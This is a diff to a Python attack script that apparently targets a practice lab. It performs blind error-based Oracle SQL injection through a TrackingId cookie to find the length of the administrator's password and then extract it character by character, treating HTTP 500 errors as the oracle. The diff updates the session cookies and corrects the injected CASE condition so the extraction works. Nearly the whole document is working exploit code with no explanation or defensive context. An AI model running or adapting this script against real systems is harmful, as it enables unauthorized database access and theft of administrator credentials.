@@ -9,7 +9,7 @@ def pass_len(url, proxies):
     for i in range(1, 32):
         payload = f"' AND (select CASE when (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users where username='administrator' and LENGTH(password) ={i}) = 'a"
         encoded_payload = parse.quote(payload)
-        cookies = {'TrackingId':'nlBPmRXOuOWN4HZ7'+encoded_payload, 'session':'dVHLZC7oyNwW6oOq6690klPnFUCbcgr7'}
+        cookies = {'TrackingId':'AcoqLL8eUC55twAc'+encoded_payload, 'session':'sERcTxHRhg9HC67jyK6grbKpP0z9fSg0'}
         r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
         if r.status_code == 500:
             return i
@@ -22,9 +22,9 @@ def bruter(url, proxies):
     pass_length = pass_len(url, proxies)
     for i in range(1, pass_length+1):
         for j in range(32, 126):
-            payload = f"' AND (select CASE when (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users where username='administrator' and ascii(SUBSTR(password, {i}, 1)) = {j}) = 'a" 
+            payload = f"' AND (select CASE when (ascii(SUBSTR(password, {i}, 1)) = {j}) THEN TO_CHAR(1/0) ELSE 'a' END FROM users where username='administrator' ) = 'a" 
             encoded_payload = parse.quote(payload)
-            cookies = {'TrackingId':'nlBPmRXOuOWN4HZ7'+encoded_payload, 'session':'dVHLZC7oyNwW6oOq6690klPnFUCbcgr7'}
+            cookies = {'TrackingId':'AcoqLL8eUC55twAc'+encoded_payload, 'session':'sERcTxHRhg9HC67jyK6grbKpP0z9fSg0'}
             r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
             if r.status_code == 500:
                 extracted += chr(j)
